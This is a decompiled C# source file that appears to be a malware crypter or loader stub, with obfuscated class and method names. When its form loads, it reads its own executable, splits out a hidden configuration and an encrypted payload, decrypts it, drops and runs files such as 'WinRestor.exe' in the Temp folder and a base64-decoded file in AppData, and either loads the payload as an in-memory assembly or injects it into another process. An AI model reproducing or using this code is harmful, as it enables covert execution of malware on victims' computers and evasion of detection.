using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace WindowsApplication;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	private const string string_0 = "Re3Hl2AkotE7DMbFdKaPODA9XdD0Nb2thJ5pEnhTsRVypHaB6wsKQhN6jbcCLrhTyvs2d1";

	private string string_1;

	private string string_2;

	private bool bool_0;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		bool_0 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				((IDisposable)icontainer_0).Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(109, 0);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		byte[] bytes = Class12.smethod_0(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "Re3Hl2AkotE7DMbFdKaPODA9XdD0Nb2thJ5pEnhTsRVypHaB6wsKQhN6jbcCLrhTyvs2d1", -1, (CompareMethod)0);
		string text = array[1];
		string text2 = array[2];
		string text3 = array[6];
		string text4 = array[10];
		string text5 = array[11];
		string text6 = array[12];
		string text7 = array[13];
		string text8 = array[14];
		string text9 = array[15];
		string text10 = array[16];
		string text11 = array[17];
		string text12 = array[20];
		try
		{
			if (Operators.CompareString(text7, "Activated", false) == 0)
			{
				MessageBox.Show(text8, text9, (MessageBoxButtons)0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(text5, "own", false) == 0)
		{
			text5 = Process.GetCurrentProcess().get_MainModule().get_FileName();
		}
		if (Operators.CompareString(text, "true", false) == 0)
		{
			Class5.smethod_0();
		}
		if (Operators.CompareString(text3, "true", false) == 0)
		{
			Class5.smethod_1();
		}
		if (Operators.CompareString(text10, "true", false) == 0)
		{
			Class5.smethod_3();
		}
		if (Operators.CompareString(text11, "true", false) == 0)
		{
			Class5.smethod_4();
		}
		if (Operators.CompareString(text4, "true", false) == 0)
		{
			Class5.smethod_6();
			Class5.smethod_7();
			Class5.smethod_8();
			Class5.smethod_9();
			Class5.smethod_10();
		}
		if (Operators.CompareString(text6, "true", false) == 0)
		{
			Class5.smethod_5();
		}
		if (Operators.CompareString(text12, "des", false) == 0)
		{
			string_1 = Class6.smethod_0(array[3], text2, bool_0: true);
		}
		else
		{
			string_1 = Class6.smethod_1(array[3], text2);
		}
		bool flag = Class11.smethod_0();
		if (Operators.CompareString(array[7], "NULL", false) != 0)
		{
			try
			{
				byte[] bytes2 = FromBase64(array[7]);
				File.WriteAllBytes(string_2 + array[8], bytes2);
				Process.Start(string_2 + array[8]);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (flag)
		{
			try
			{
				string tempPath = Path.GetTempPath();
				FileSystem.FileOpen(5, tempPath + "\\WinRestor.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
				FileSystem.FilePut(5, string_1, -1L, false);
				FileSystem.FileClose(new int[1] { 5 });
				Process.Start(tempPath + "\\WinRestor.exe");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		switch (flag)
		{
		case false:
			if (method_1())
			{
				Thread thread2 = new Thread(delegate(object object_0)
				{
					demmarages(Conversions.ToString(object_0));
				});
				thread2.TrySetApartmentState(ApartmentState.STA);
				thread2.Start(Class6.smethod_0(array[3], text2, bool_0: true));
				((Form)this).Close();
				break;
			}
			try
			{
				ganjaman ganjaman3 = new ganjaman();
				byte[] bytes4 = Encoding.Default.GetBytes(string_1);
				ganjaman3.moninject(bytes4, text5);
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			ProjectData.EndApp();
			break;
		case true:
			try
			{
				if (method_1())
				{
					Thread thread = new Thread(delegate(object object_0)
					{
						demmarages(Conversions.ToString(object_0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(Class6.smethod_0(array[3], text2, bool_0: true));
					((Form)this).Close();
				}
				else
				{
					ganjaman ganjaman2 = new ganjaman();
					byte[] bytes3 = Encoding.Default.GetBytes(string_1);
					ganjaman2.moninject(bytes3, text5);
				}
				break;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	private void method_0(byte[] byte_0)
	{
		Assembly assembly = Assembly.Load(byte_0);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	private bool method_1()
	{
		if (string_1.Contains("</assembly>"))
		{
			string[] array = Strings.Split(string_1, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public void demmarages(string split)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(split);
		Thread thread = new Thread(delegate(object object_0)
		{
			method_0((byte[])object_0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	public byte[] FromBase64(string base64)
	{
		if (base64 == null)
		{
			throw new ArgumentNullException("base64");
		}
		return Convert.FromBase64String(base64);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_2(object object_0)
	{
		demmarages(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_3(object object_0)
	{
		demmarages(Conversions.ToString(object_0));
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_4(object object_0)
	{
		method_0((byte[])object_0);
	}
}
